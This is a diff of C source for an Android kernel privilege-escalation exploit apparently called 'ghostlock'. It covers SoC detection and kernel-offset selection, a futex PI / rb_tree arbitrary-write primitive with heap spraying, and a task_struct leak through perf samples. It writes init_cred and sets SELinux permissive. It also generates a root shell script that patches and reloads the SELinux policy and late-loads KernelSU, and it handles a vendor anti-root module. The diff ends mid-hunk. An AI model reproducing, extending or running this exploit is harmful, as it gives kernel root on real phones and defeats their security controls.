@@ -21,39 +21,39 @@ const struct kernel_offsets *active_offsets = NULL;
 static char g_home_dir[256] = "/data/local/tmp";
 static char g_root_script_path[300] = "/data/local/tmp/.ghostlock_root.sh";
 
-#define MAX_W2_ATTEMPTS 6
-#define MAX_W3_ATTEMPTS 3
-#define MAX_W3_CHAIN_ROUNDS 3
+/* MTK and XRing use different physical mappings from the Qualcomm default.
+ * W1 has no root and /proc is SELinux-blocked: read SoC properties from the
+ * shared property area instead. */
+enum soc_family {
+  SOC_QCOM = 0,
+  SOC_MTK,
+  SOC_XRING,
+};
 
-/* MTK loads the kernel at the DRAM base (text_offset=0), Qualcomm via the
- * bootloader; the same uname -r can serve both families, so detect at
- * runtime.  W1 has no root and /proc is SELinux-blocked: read SoC
- * properties (shared area, no permission needed). */
-static int soc_is_mtk(void) {
+static enum soc_family detect_soc(void) {
   char buf[256];
-  if (__system_property_get("ro.soc.manufacturer", buf) > 0) {
-    if (strncasecmp(buf, "mediatek", 8) == 0 ||
-        strncasecmp(buf, "mtk", 3) == 0) {
-      return 1;
-    }
-    if (strncasecmp(buf, "qti", 3) == 0 ||
-        strncasecmp(buf, "qualcomm", 8) == 0) {
-      return 0;
-    }
-  }
-  const char *keys[] = {"ro.soc.model", "ro.board.platform", NULL};
+  const char *keys[] = {"ro.soc.manufacturer", "ro.soc.model",
+                        "ro.board.platform", NULL};
   for (int i = 0; keys[i]; i++) {
     if (__system_property_get(keys[i], buf) <= 0 || !buf[0]) {
       continue;
     }
-    if (strncasecmp(buf, "mt", 2) == 0) {
-      return 1;
-    }
-    if (strncasecmp(buf, "sm", 2) == 0 || strncasecmp(buf, "qcom", 4) == 0) {
-      return 0;
+    if (strncasecmp(buf, "mediatek", 8) == 0 ||
+        strncasecmp(buf, "mtk", 3) == 0 ||
+        (i > 0 && strncasecmp(buf, "mt", 2) == 0)) {
+      return SOC_MTK;
     }
   }
-  return 0;
+  for (int i = 0; keys[i]; i++) {
+    if (__system_property_get(keys[i], buf) <= 0 || !buf[0]) {
+      continue;
+    }
+    if (strncasecmp(buf, "xring", 5) == 0 ||
+        (i > 0 && strncasecmp(buf, "o1", 2) == 0)) {
+      return SOC_XRING;
+    }
+  }
+  return SOC_QCOM;
 }
 
 /* Override target.h _OFF macros with dynamic offsets from offsets.h table */
@@ -81,35 +81,69 @@ static int soc_is_mtk(void) {
 
 /* Override struct field offsets (task_struct, etc.) with per-device values */
 #include "runtime_struct_offsets.h"
+/* VR.ko anti-root fallback defines */
+#ifndef VR_TAG_A_OFF
+#define VR_TAG_A_OFF           0x06
+#endif
+#ifndef VR_TAG_B_OFF
+#define VR_TAG_B_OFF           0x2c
+#endif
+#ifndef VR_SYSCALL_TP_FLAG
+#define VR_SYSCALL_TP_FLAG     0x400ULL
+#endif
+#ifndef TASK_THREAD_INFO_FLAGS_OFF
+#define TASK_THREAD_INFO_FLAGS_OFF 0x00
+#endif
 #include "offsets_json.h"
 
 static struct kernel_offsets g_external_offsets;
 static char g_external_release[192];
 
-/* Publish the active entry's init_cred image address and the physical load
- * address (MTK always loads at the DRAM base, text_offset=0). */
+/* Entries carry a phys load address only when measured; otherwise MTK uses
+ * the DRAM base, xring its constant, qcom its GKI version. */
 static void publish_active_offsets(void) {
   g_init_cred_image = INIT_CRED;
+  enum soc_family soc = detect_soc();
+  const char *soc_name =
+      soc == SOC_MTK ? "mtk" : soc == SOC_XRING ? "xring" : "qcom/other";
   if (active_offsets->kernel_phys_load) {
     p0_kernel_phys_load = active_offsets->kernel_phys_load;
-  }
-  int mtk = soc_is_mtk();
-  if (mtk) {
+  } else if (soc == SOC_MTK) {
     p0_kernel_phys_load = KIMAGE_TEXT_BASE - MTK_VADDR_BASE;
+    soc_name = "mtk";
+  } else if (soc == SOC_XRING) {
+    p0_kernel_phys_load = XRING_KERNEL_PHYS_LOAD;
+    soc_name = "xring";
+  } else if (strncmp(active_offsets->uname_r, "6.12.", 5) == 0) {
+    p0_kernel_phys_load = QC_GKI_6_12_PHYS_LOAD;
+    soc_name = "qcom/6.12";
   }
   pr_info("soc: %s; kernel_phys_load=0x%llx\n",
-          mtk ? "mtk" : "qcom/other",
-          (unsigned long long)p0_kernel_phys_load);
+          soc_name, (unsigned long long)p0_kernel_phys_load);
   pr_info("init_cred image=%016zx alias=%016zx\n",
           (size_t)g_init_cred_image, (size_t)data_addr(g_init_cred_image));
 }
 
-/* Import a matching OTA-parsed entry from <home>/offsets.json.  The table is
- * always zeroed first: no compiled per-kernel values seed or replace it. */
+/* Import a matching entry from <home>/offsets.json; returns 0 and activates
+ * the external table on success.  When the release is also registered in the
+ * built-in table, the entry starts from the built-in values so fields the
+ * JSON leaves empty keep the built-in ones instead of falling back to
+ * target.h defaults. */
 static int try_external_offsets(const char *release) {
   char path[320];
   snprintf(path, sizeof(path), "%s/offsets.json", g_home_dir);
-  memset(&g_external_offsets, 0, sizeof(g_external_offsets));
+  const struct kernel_offsets *builtin = NULL;
+  for (int i = 0; known_offsets[i].uname_r; i++) {
+    if (strcmp(release, known_offsets[i].uname_r) == 0) {
+      builtin = &known_offsets[i];
+      break;
+    }
+  }
+  if (builtin) {
+    g_external_offsets = *builtin;
+  } else {
+    memset(&g_external_offsets, 0, sizeof(g_external_offsets));
+  }
   int rc = load_offsets_json(path, release, &g_external_offsets,
                              g_external_release, sizeof(g_external_release));
   if (rc == 0) {
@@ -132,14 +166,24 @@ static int select_offsets(void) {
     return -1;
   }
 #endif
-  /* OTA-parsed offsets are the only supported runtime source. */
+  /* Imported offsets win over the built-in tables so refreshed values take
+   * effect without rebuilding the app. */
   if (try_external_offsets(uts.release) == 0) {
     publish_active_offsets();
     return 0;
   }
-  pr_error("no OTA-parsed offsets for kernel: %s\n", uts.release);
-  pr_error("parse the current device full OTA to create a matching "
-           "offsets.json entry in %s\n", g_home_dir);
+  for (int i = 0; known_offsets[i].uname_r; i++) {
+    if (strcmp(uts.release, known_offsets[i].uname_r) == 0) {
+      active_offsets = &known_offsets[i];
+      pr_success("offsets matched: %s\n", active_offsets->uname_r);
+      publish_active_offsets();
+      return 0;
+    }
+  }
+  pr_error("no offsets for kernel: %s\n", uts.release);
+  pr_error("add this kernel to offsets.h and rebuild, or import a matching "
+           "offsets.json entry into %s\n",
+           g_home_dir);
   return -1;
 }
 
@@ -189,7 +233,11 @@ void *waiter_thread(void *arg __attribute__((unused))) {
   timeout.tv_sec += ROUTE_WAIT_SECONDS;
   atomic_store(&waiter_waiting, 1);
   futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
-  do_pselect_fake_lock_route();
+  if (tcp_route_selected()) {
+    do_tcp_fake_lock_route();
+  } else {
+    do_pselect_fake_lock_route();
+  }
   atomic_store(&route_done, 1);
   futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
   while (!atomic_load(&owner_chain_done)) usleep(1000);
@@ -234,7 +282,12 @@ void *consumer_thread(void *arg __attribute__((unused))) {
         atomic_fetch_add(&consumer_calls, 1);
         atomic_store(&consumer_inflight, 1);
         errno = 0;
-        long sched_ret = sched_setattr_tid(tid, PSELECT_CONSUMER_NICE);
+        /* rotate the nice every call; (calls%19)+1 is what makes
+         * sched_setattr succeed on 6.1 compact */
+        int consumer_nice = (active_offsets && active_offsets->compact_waiter)
+                                ? (calls_this_seq % 19) + 1
+                                : PSELECT_CONSUMER_NICE;
+        long sched_ret = sched_setattr_tid(tid, consumer_nice);
         if (sched_ret != 0) {
           struct timespec ft = {.tv_sec = 0, .tv_nsec = 50000000};
           long fret = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, &ft, NULL, 0);
@@ -295,36 +348,9 @@ int run_main_route_threads(void) {
 
 static int do_one_write(uintptr_t target, const char *desc, int mode, int leaf) {
   pr_info("=== %s === target=0x%016zx mode=%d leaf=%d\n", desc, target, mode, leaf);
-  /* 5.15 kernels use the mcast+plist primitive (no pselect/rb_tree). */
-  if (active_offsets && active_offsets->uses_mcast_plist) {
-    /* The reference so writes the static kernel scratch address
-     * (data_addr(_text)+0x2d92e38, printed as scratch=ffffff802ad92e38) into
-     * the target.  __rb_erase writes [target]=value; value must look like a
-     * valid kernel pointer (bit16=1, low-3 bits clear) so the erase relink
-     * walks a safe parent instead of NULL.  Writing scratch into
-     * selinux_state.enforcing flips SELinux to permissive. */
-    uint64_t value;
-    switch (mode) {
-      case 2: value = INIT_CRED; break;         /* cred = init_cred */
-      default: value = data_addr(KIMAGE_TEXT_BASE) + MCAST_SCRATCH_OFF; break;
-    }
-    TIMER("  mcast heap spray start");
-    /* First spray the fake node, then trigger the PI-chain plist write. */
-    int made = mcast_spray_nodes(value, target, 96);
-    if (made <= 0) {
-      pr_warning("  mcast spray failed\n");
-      mcast_teardown();
-      return 0;
-    }
-    int routed = mcast_plist_write(target, value, 3);
-    mcast_teardown();
-    TIMER("  mcast plist write done");
-    return routed == 0;
-  }
-  /* leaf=1 uses the "write 0" payload (fake_right=0). __rb_erase_augmented()
-   * case 1 then makes __rb_change_child() write parent->rb_right (= target)
-   * with the erased node's rb_right value: fake_left is always NULL so case 1
-   * always fires, and the erased node is RED so no color fixup runs. */
+  /* Both transports write *(target) := value through the erase left-only
+   * relink: waiter words are {pc = value, right = 0, left = target} and
+   * the node is RED so no color fixup runs. leaf=1 is the value=0 payload. */
   pselect_child_node = leaf ? 0 : 1;
   set_pselect_write_mode(target, mode);
   TIMER("  heap spray start");
@@ -471,19 +497,152 @@ static void init_runtime_paths(void) {
   pr_info("runtime home=%s script=%s\n", g_home_dir, g_root_script_path);
 }
 
-static int validate_root_script(void) {
-  if (access(g_root_script_path, R_OK) != 0) {
-    pr_warning("shared root script missing path=%s errno=%d\n",
+static void write_root_script(void) {
+  char script[8192];
+  int sfd = open(g_root_script_path, O_WRONLY | O_CREAT | O_TRUNC, 0755);
+  if (sfd < 0) {
+    pr_warning("open root script failed path=%s errno=%d\n",
                g_root_script_path, errno);
-    return -1;
+    return;
   }
-  if (chmod(g_root_script_path, 0755) != 0) {
-    pr_warning("chmod shared root script failed path=%s errno=%d\n",
-               g_root_script_path, errno);
-    return -1;
+
+  int n = snprintf(
+      script, sizeof(script),
+      "#!/system/bin/sh\n"
+      "HOME_DIR='%s'\n"
+      "LOG=\"$HOME_DIR/.ghostlock_ksu.log\"\n"
+      "KSUD=\"$HOME_DIR/ksud\"\n"
+      "echo \"[*] root script start uid=$(id -u) euid=$(id -u)\" >\"$LOG\"\n"
+      "chmod 644 \"$LOG\" 2>/dev/null\n"
+      "echo \"[*] seccomp=$(grep Seccomp /proc/self/status 2>/dev/null | tr '\\n' ' ')\" >>\"$LOG\"\n"
+      "if [ ! -x \"$KSUD\" ]; then\n"
+      "  KSUD=$(find /data/app -path '*/me.weishu.kernelsu.pr*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
+      "fi\n"
+      "if [ ! -x \"$KSUD\" ]; then\n"
+      "  KSUD=$(find /data/app -path '*/me.weishu.kernelsu-*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
+      "fi\n"
+      "if [ ! -x \"$KSUD\" ]; then\n"
+      "  KSUD=$(find /data/app -path '*/com.resukisu.resukisu*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
+      "fi\n"
+      "if [ ! -x \"$KSUD\" ]; then\n"
+      "  KSUD=$(find /data/app -path '*/com.kowx712.supermanager*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
+      "fi\n"
+      "if [ -z \"$KSUD\" ]; then KSUD=/data/local/tmp/ksud; fi\n"
+      "if [ ! -x \"$KSUD\" ]; then KSUD=/data/adb/ksu/bin/ksud; fi\n"
+      "echo \"[*] ksud=$KSUD\" >>\"$LOG\"\n"
+      "echo \"[*] ksud_file=$(ls -l \"$KSUD\" 2>/dev/null)\" >>\"$LOG\"\n"
+      "echo \"[*] uname=$(uname -r)\" >>\"$LOG\"\n"
+      "if [ \"$(id -u)\" -ne 0 ]; then\n"
+      "  echo '[!] temp su unavailable; aborting' >>\"$LOG\"\n"
+      "  exit 1\n"
+       "fi\n"
+       "if grep -q '^kernelsu[[:space:]]' /proc/modules 2>/dev/null; then\n"
+       "  echo '[+] KernelSU already loaded' >>\"$LOG\"\n"
+       "fi\n"
+      "KVER=$(uname -r | cut -d. -f1-2)\n"
+      "AVER=$(uname -r | grep -o 'android[0-9]*' | head -1)\n"
+      "if [ -z \"$AVER\" ] || [ -z \"$KVER\" ]; then\n"
+      "  echo '[!] cannot parse KMI from uname -r' >>\"$LOG\"\n"
+      "  exit 1\n"
+      "fi\n"
+      "KMI=\"${AVER}-${KVER}\"\n"
+      "# safe mode: disable all modules before exec ksud\n"
+      "if [ \"$GHOSTLOCK_DISABLE_MODULES\" = \"1\" ]; then\n"
+      "  echo \"[*] safe mode: disabling all modules under /data/adb/modules\" >>\"$LOG\"\n"
+      "  n=0\n"
+      "  for m in /data/adb/modules/*/; do\n"
+      "    [ -d \"$m\" ] || continue\n"
+      "    if touch \"${m}disable\" 2>/dev/null; then\n"
+      "      n=$((n+1))\n"
+      "      echo \"  disabled ${m}\" >>\"$LOG\"\n"
+      "    fi\n"
+      "  done\n"
+      "  echo \"[*] safe mode: $n module(s) disabled\" >>\"$LOG\"\n"
+      "fi\n"
+      "# step 1: restore policy\n"
+      "POLICY=$(mktemp \"$HOME_DIR/.ghostlock_policy.XXXXXX\") || {\n"
+      "  echo '[!] cannot create policy dump' >>\"$LOG\"\n"
+      "  exit 1\n"
+      "}\n"
+      "trap 'rm -f \"$POLICY\"' EXIT\n"
+      "prepare_policy() {\n"
+      "  cat /sys/fs/selinux/policy >\"$POLICY\" || return 1\n"
+      "  HEADER=$(od -An -tx1 -N24 \"$POLICY\" | tr -d ' \\n')\n"
+      "  case \"$HEADER\" in\n"
+      "    8cff7cf9080000005345204c696e7578????????????????) ;;\n"
+      "    *) echo '[!] invalid policy header'; return 1 ;;\n"
+      "  esac\n"
+      "  # Restore missing Android netlink flags: bits 30/31, byte 23.\n"
+      "  CONFIG=$(od -An -tu1 -j23 -N1 \"$POLICY\") || return 1\n"
+      "  [ -n \"$CONFIG\" ] || return 1\n"
+      "  CONFIG=$(printf '\\\\0%%03o' \"$((CONFIG | 192))\") || return 1\n"
+      "  printf '%%b' \"$CONFIG\" | dd of=\"$POLICY\" bs=1 seek=23 count=1 conv=notrunc\n"
+      "}\n"
+      "FIXUP_RC=1\n"
+      "for i in $(seq 1 10); do\n"
+      "  echo \"[*] fixup: attempt $i\" >>\"$LOG\"\n"
+      "  if ! prepare_policy >>\"$LOG\" 2>&1; then\n"
+      "    sleep 2\n"
+      "    continue\n"
+      "  fi\n"
+      "  load_policy \"$POLICY\" >>\"$LOG\" 2>&1 &\n"
+      "  LPID=$!\n"
+      "  (sleep 8; kill -9 $LPID 2>/dev/null) &\n"
+      "  SPID=$!\n"
+      "  wait $LPID 2>/dev/null\n"
+      "  FIXUP_RC=$?\n"
+      "  kill $SPID 2>/dev/null\n"
+      "  if [ \"$FIXUP_RC\" -eq 0 ]; then\n"
+      "    break\n"
+      "  fi\n"
+      "  sleep 2\n"
+      "done\n"
+      "echo \"[*] policy fixup rc=$FIXUP_RC\" >>\"$LOG\"\n"
+      "if [ \"$FIXUP_RC\" -eq 0 ]; then\n"
+      "# load_policy ok: late-load (module init re-enforces); already-loaded restores below\n"
+      "if grep -q kernelsu /proc/modules 2>/dev/null; then\n"
+      "  KSU_ALREADY=1\n"
+      "  echo \"[*] kernelsu already loaded; skipping late-load\" >>\"$LOG\"\n"
+      "else\n"
+      "  KSU_ALREADY=0\n"
+      "  if [ ! -x \"$KSUD\" ]; then\n"
+      "    echo '[!] ksud missing; cannot late-load' >>\"$LOG\"\n"
+      "    exit 1\n"
+      "  fi\n"
+      "  echo \"[*] late-load kmi=$KMI\" >>\"$LOG\"\n"
+      "  chmod 755 \"$KSUD\" 2>/dev/null\n"
+      "  \"$KSUD\" late-load --kmi \"$KMI\" --allow-shell >>\"$LOG\" 2>&1\n"
+      "  echo \"[*] late-load exit=$?\" >>\"$LOG\"\n"
+      "fi\n"
+      "echo \"[*] temp su uid=$(id -u); watching kernelsu.ko\" >>\"$LOG\"\n"
+      "KSU_READY=0\n"
+      "for i in $(seq 1 50); do\n"
+      "  if grep -q kernelsu /proc/modules 2>/dev/null; then KSU_READY=1; break; fi\n"
+      "  sleep 0.1\n"
+      "done\n"
+      "if [ \"$KSU_READY\" -ne 1 ]; then\n"
+      "  echo '[!] KernelSU module not loaded' >>\"$LOG\"\n"
+      "  exit 1\n"
+      "fi\n"
+      "echo '[+] KernelSU module loaded' >>\"$LOG\"\n"
+      "if [ \"$KSU_ALREADY\" -eq 1 ]; then\n"
+      "  echo \"[*] kernelsu already loaded; restoring enforcing\" >>\"$LOG\"\n"
+      "  echo 1 > /sys/fs/selinux/enforce 2>/dev/null\n"
+      "fi\n"
+      "else\n"
+      "  echo '[!] fixup failed; SELinux left permissive' >>\"$LOG\"\n"
+      "fi\n",
+      g_home_dir);
+  if (n < 0 || n >= (int)sizeof(script)) {
+    pr_warning("root script too long\n");
+    close(sfd);
+    return;
   }
-  pr_info("using packaged shared root script path=%s\n", g_root_script_path);
-  return 0;
+  if (write(sfd, script, (size_t)n) != n) {
+    pr_warning("write root script failed errno=%d\n", errno);
+  }
+  close(sfd);
+  chmod(g_root_script_path, 0755);
 }
 
 static int kernelsu_module_loaded(void) {
@@ -504,7 +663,7 @@ static int kernelsu_module_loaded(void) {
 }
 
 /* Find a task through perf sample records. */
-uintptr_t perf_find_task(void) {
+static uintptr_t perf_find_task(void) {
   struct perf_event_attr pe;
   memset(&pe, 0, sizeof(pe));
   pe.type = PERF_TYPE_SOFTWARE;
@@ -540,23 +699,8 @@ uintptr_t perf_find_task(void) {
   char *base = (char *)buf + 4096;
   size_t dsz = 4096 * 32;
   uint64_t pos = hdr->data_tail;
-  /* The original heuristic votes over only the first 256 kernel-address
-   * register values (roughly 8 samples), so noise dominates and the task
-   * pointer wins by a thin margin.  Widen the pool so the task_struct
-   * pointer, which kernel code keeps in registers across many samples,
-   * accumulates a decisive plurality.  The SP field is not trusted on its
-   * own: in an el1 (kernel-mode interrupt) frame pt_regs.sp is the kernel
-   * stack pointer, so it is only used to cross-check the global winner. */
-  enum { PERF_REG_SP = 31, MAX_CANDS = 4096 };
-  uintptr_t *sp_cands = calloc(MAX_CANDS, sizeof(uintptr_t));
-  uintptr_t *cands = calloc(MAX_CANDS, sizeof(uintptr_t));
-  if (!sp_cands || !cands) {
-    free(sp_cands); free(cands);
-    return 0;
-  }
-  int nsp = 0;
-  int nc = 0;
-  while (pos < head && (nsp < MAX_CANDS || nc < MAX_CANDS)) {
+  uintptr_t cands[256]; int nc = 0;
+  while (pos < head && nc < 256) {
     struct perf_event_header *ev = (void *)(base + (pos % dsz));
     if (ev->size == 0) break;
     if (ev->type == PERF_RECORD_SAMPLE) {
@@ -565,15 +709,11 @@ uintptr_t perf_find_task(void) {
       uint64_t abi = *(uint64_t *)p; p += 8;
       if (abi == 1 || abi == 2) {
         uint64_t *regs = (uint64_t *)p;
-        uint64_t sp = regs[PERF_REG_SP];
-        if (sp > 0xffffff8000000000ULL && sp < 0xfffffffe00000000ULL &&
-            (sp & 0x7) == 0 && nsp < MAX_CANDS) {
-          sp_cands[nsp++] = sp;
-        }
-        for (int i = 0; i < 32 && nc < MAX_CANDS; i++) {
+        for (int i = 0; i < 32 && nc < 256; i++) {
           uint64_t v = regs[i];
-          if (v > 0xffffff8000000000ULL && v < 0xfffffffe00000000ULL &&
-              (v & 0x7) == 0)
+          /* the tag nibble replaces bits 56-59; 0xf restores the canonical VA */
+          v |= 0x0fULL << 56;
+          if (v > 0xffffff8000000000ULL && v < DIRECT_MAP_END)
             cands[nc++] = v;
         }
       }
@@ -581,131 +721,29 @@ uintptr_t perf_find_task(void) {
     pos += ev->size;
   }
   hdr->data_tail = head; munmap(buf, msz); close(fd);
-  if (!nc) { free(sp_cands); free(cands); return 0; }
-
-  /* Vote over the full pool: the task_struct pointer appears in registers
-   * across virtually every sample, so it should dominate the count. */
+  if (!nc) return 0;
   uintptr_t best = 0; int best_cnt = 0;
   for (int i = 0; i < nc; i++) {
     int cnt = 0;
     for (int j = 0; j < nc; j++) if (cands[j] == cands[i]) cnt++;
     if (cnt > best_cnt) { best_cnt = cnt; best = cands[i]; }
   }
-
-  /* Cross-check with the SP field: sp_el0 during a kernel-mode (el0) sample
-   * is the current task, so if the same address wins the SP vote too it is
-   * almost certainly the task_struct. */
-  if (best) {
-    uintptr_t sp_best = 0; int sp_cnt = 0;
-    for (int i = 0; i < nsp; i++) {
-      int cnt = 0;
-      for (int j = 0; j < nsp; j++) if (sp_cands[j] == sp_cands[i]) cnt++;
-      if (cnt > sp_cnt) { sp_cnt = cnt; sp_best = sp_cands[i]; }
-    }
-    if (sp_best == best) {
-      pr_info("perf task: 0x%016zx (%d/%d votes, sp-confirmed)\n",
-              best, best_cnt, nc);
-    } else {
-      pr_info("perf task: 0x%016zx (%d/%d votes, sp=%016zx x%d)\n",
-              best, best_cnt, nc, sp_best, sp_cnt);
-    }
-  }
-  free(sp_cands); free(cands);
+  pr_info("perf task: 0x%016zx (%d/%d votes)\n", best, best_cnt, nc);
   return best;
 }
 
-/* ---- Phase 2: kprobe __set_task_comm task leak (reference approach) ----
- * The child sets its comm via prctl(PR_SET_NAME) -> __set_task_comm(current,..)
- * which also renames the parent's task-pi-blocked waiter.  A kprobe on
- * __set_task_comm captures x0 (the task_struct) precisely, so we do not have
- * to vote over noisy perf samples.  Runs after W1 (SELinux permissive), so
- * kprobe_events is writable.  perf_find_task() stays as the fallback. */
-
-const char *tracefs_dir(void) {
-  static const char *dirs[] = {"/sys/kernel/tracing",
-                               "/sys/kernel/debug/tracing"};
-  for (int i = 0; i < 2; i++)
-    if (access(dirs[i], F_OK) == 0) return dirs[i];
-  return NULL;
-}
-
-/* Write `data` to <tracefs>/<rel>; returns 0 on full write, -1 otherwise. */
-int tracefs_write(const char *base, const char *rel, const char *data) {
-  char path[300];
-  snprintf(path, sizeof path, "%s/%s", base, rel);
-  int fd = open(path, O_WRONLY | O_TRUNC);
-  if (fd < 0) return -1;
-  size_t len = strlen(data);
-  ssize_t n;
-  do {
-    n = write(fd, data, len);
-  } while (n < 0 && errno == EINTR);
-  close(fd);
-  return (n == (ssize_t)len) ? 0 : -1;
-}
-
-void teardown_ksetask_kprobe(void) {
-  const char *td = tracefs_dir();
-  if (!td) return;
-  tracefs_write(td, "events/kprobes/ghosttask/enable", "0");
-  tracefs_write(td, "kprobe_events", "-:ghosttask");
-}
-
-/* Arm a kprobe on __set_task_comm.  Try $arg1 (standard) then %x0 (what the
- * reference .so uses) so it works across kernel fetcharg syntaxes. */
-int setup_ksetask_kprobe(void) {
-  const char *td = tracefs_dir();
-  if (!td) return -1;
-  uint32_t real = active_offsets ? active_offsets->task_real_cred : 0x790;
-  uint32_t cred = active_offsets ? active_offsets->task_cred : 0x798;
-  char line[256];
-  int n = snprintf(line, sizeof line,
-                   "p:ghosttask __set_task_comm task=$arg1:x64 "
-                   "real=+0x%x($arg1):x64 cred=+0x%x($arg1):x64",
-                   real, cred);
-  if (n <= 0 || n >= (int)sizeof line) return -1;
-  if (tracefs_write(td, "kprobe_events", line) != 0) {
-    /* Fall back to the reference's %x0 register fetch syntax. */
-    n = snprintf(line, sizeof line,
-                 "p:ghosttask __set_task_comm task=%s real=+0x%x(%s):x64 "
-                 "cred=+0x%x(%s):x64",
-                 "%x0", real, "%x0", cred, "%x0");
-    if (n <= 0 || n >= (int)sizeof line) return -1;
-    if (tracefs_write(td, "kprobe_events", line) != 0) return -1;
-  }
-  if (tracefs_write(td, "events/kprobes/ghosttask/enable", "1") != 0) {
-    teardown_ksetask_kprobe();
-    return -1;
-  }
-  return 0;
-}
-
-/* Parse the last trace entry for `pid`; returns the captured task (x0) or 0. */
-uintptr_t read_ksetask_kprobe(pid_t pid) {
-  const char *td = tracefs_dir();
-  if (!td) return 0;
-  char path[300];
-  snprintf(path, sizeof path, "%s/trace", td);
-  FILE *f = fopen(path, "r");
-  if (!f) return 0;
-  uintptr_t task = 0;
-  char *line = NULL;
-  size_t cap = 0;
-  while (getline(&line, &cap, f) >= 0) {
-    if (!strstr(line, "ghosttask:")) continue;
-    char *dash = strchr(line, '-');
-    if (!dash) continue;
-    long tp = strtol(dash + 1, NULL, 10);
-    if (tp != (long)pid) continue;
-    char *tag = strstr(line, "task=");
-    if (tag) task = strtoull(tag + 5, NULL, 16);
-  }
-  free(line);
-  fclose(f);
-  return task;
-}
-
 struct child_pipes { int task_r, task_w, cmd_r, cmd_w, uid_r, uid_w; };
+
+/* rooted exits kfree the static init_cred (w2 stores it with no
+ * get_cred). park forever, oom_score_adj -1000 so lmkd skips us. */
+static void park_rooted_child(void) {
+  FILE *f = fopen("/proc/self/oom_score_adj", "w");
+  if (f) {
+    fputs("-1000", f);
+    fclose(f);
+  }
+  for (;;) pause();
+}
 
 static void child_main(struct child_pipes *p) {
   close(p->task_r); close(p->cmd_w); close(p->uid_r);
@@ -713,7 +751,16 @@ static void child_main(struct child_pipes *p) {
   fcntl(p->uid_w, F_SETFD, FD_CLOEXEC);  /* keep the probe pipe out of the
                                           * root shell / ksud chain */
   prctl(PR_SET_NAME, "ghostleaf_0123456789");
+  /* a real leak reproduces, a fluke vote winner does not. w2 writes to
+   * this address, so two runs must agree or the leak is discarded. */
   uintptr_t my_task = perf_find_task();
+  int leak_agreed = 0;
+  for (int i = 0; i < 2 && my_task; i++) {
+    uintptr_t again = perf_find_task();
+    if (again == my_task) { leak_agreed = 1; break; }
+    my_task = again;
+  }
+  if (!leak_agreed) my_task = 0;
   write(p->task_w, &my_task, sizeof(my_task));
   close(p->task_w);
   if (!my_task) _exit(1);
@@ -772,6 +819,12 @@ static void child_main(struct child_pipes *p) {
         ((uint32_t)len << 8) | (uint32_t)(unsigned char)comm[0];
       write(p->uid_w, &report, sizeof(report));
     }
+    else if (cmd == 'P') {
+      /* w2 rooted this task; park */
+      close(p->cmd_r);
+      close(p->uid_w);
+      park_rooted_child();
+    }
     else if (cmd == 'G' || cmd == 'X') break;
   }
   close(p->cmd_r);
@@ -791,11 +844,14 @@ static void child_main(struct child_pipes *p) {
     execl("/system/bin/sh", "sh", g_root_script_path, NULL);
     _exit(1);
   }
-  if (worker < 0) { close(p->uid_w); _exit(1); }
-  /* Do not wait: the root shell runs to completion on its own; the parent
-   * polls the app-readable log. */
+  if (worker < 0) {
+    pr_warning("fork() for root shell failed errno=%d; parking rooted child\n", errno);
+    close(p->uid_w);
+    park_rooted_child();
+  }
+  /* the worker holds a fresh cred copy; this task holds the raw init_cred */
   close(p->uid_w);
-  _exit(0);
+  park_rooted_child();
 }
 
 static pid_t spawn_child(struct child_pipes *p) {
@@ -811,6 +867,17 @@ static pid_t spawn_child(struct child_pipes *p) {
   return child;
 }
 
+/* Fork the victim and read back the task pointer perf leaked. */
+static pid_t spawn_victim(struct child_pipes *p, uintptr_t *task_out) {
+  pid_t child = spawn_child(p);
+  if (child < 0) return -1;
+  uintptr_t task = 0;
+  ssize_t nr = read(p->task_r, &task, sizeof(task));
+  close(p->task_r);
+  *task_out = (nr == (ssize_t)sizeof(task)) ? task : 0;
+  return child;
+}
+
 typedef int (*write_stage_verify_fn)(void *context);
 
 static int retry_write_stage(
@@ -819,6 +886,9 @@ static int retry_write_stage(
     int leaf) {
   for (int attempt = 1; attempt <= attempts; attempt++) {
     pr_info("%s attempt %d/%d\n", stage, attempt, attempts);
+    /* the previous attempt's write can land after its verify read; check
+     * before paying for another heap spray */
+    if (attempt > 1 && verify(context)) return 1;
     if (attempt == 1) slab_drain();
     int routed = do_one_write(target, stage, mode, leaf);
     if (!routed) {
@@ -830,7 +900,8 @@ static int retry_write_stage(
     if (verify(context)) return 1;
     usleep(50000);
   }
-  return 0;
+  /* the last write can land after its verify read */
+  return verify(context);
 }
 
 static int verify_selinux_stage(void *context) {
@@ -921,9 +992,10 @@ int run_exploit(int argc, char **argv) {
   set_unbuffer();
   signal(SIGPIPE, SIG_IGN);
   set_limit();
+  reserve_standard_io();
   init_cpu_config();
   init_runtime_paths();
-  if (validate_root_script() < 0) return 1;
+  write_root_script();
 
   if (!active_offsets && select_offsets() < 0) return 1;
 
@@ -965,107 +1037,142 @@ int run_exploit(int argc, char **argv) {
   uintptr_t child_task = 0;
   int child_alive = 1;
   int seccomp_ok = 0;
-
-  /* Phase 2: arm a kprobe on __set_task_comm before spawning the child, so
-   * the child's PR_SET_NAME fires it and we get the task_struct precisely.
-   * Falls back to the perf path if kprobe_events is not writable. */
-  int kprobe_armed = (setup_ksetask_kprobe() == 0);
-  if (kprobe_armed) {
-    pr_info("ksetask kprobe armed\n");
-  } else {
-    pr_info("ksetask kprobe unavailable; using perf leak\n");
-  }
+  int ever_rooted = 0;
+  pid_t parked_child = -1;
+  int parked_cmd_w = -1;
 
   /* W2+W3 as a retryable chain: a missed W3 write or probe can kill the
-   * child, so respawn and redo instead of aborting. */
-  for (int round = 1; round <= MAX_W3_CHAIN_ROUNDS; round++) {
+   * child, so respawn and redo. */
+  for (int round = 1; round <= 3; round++) {
     if (round > 1) {
-      pr_warning("W3 chain retry %d/%d: respawning child\n",
-                 round, MAX_W3_CHAIN_ROUNDS);
+      pr_warning("W3 chain retry %d/3: parking rooted child\n", round);
       if (child > 0 && child_alive) {
-        kill(-child, SIGKILL);
-        waitpid(child, NULL, 0);
+        write(pipes.cmd_w, "P", 1);
+        usleep(50000);
+        parked_child = child;
+        parked_cmd_w = pipes.cmd_w;
+      } else {
+        close(pipes.cmd_w);
       }
-      close(pipes.cmd_w); close(pipes.uid_r);
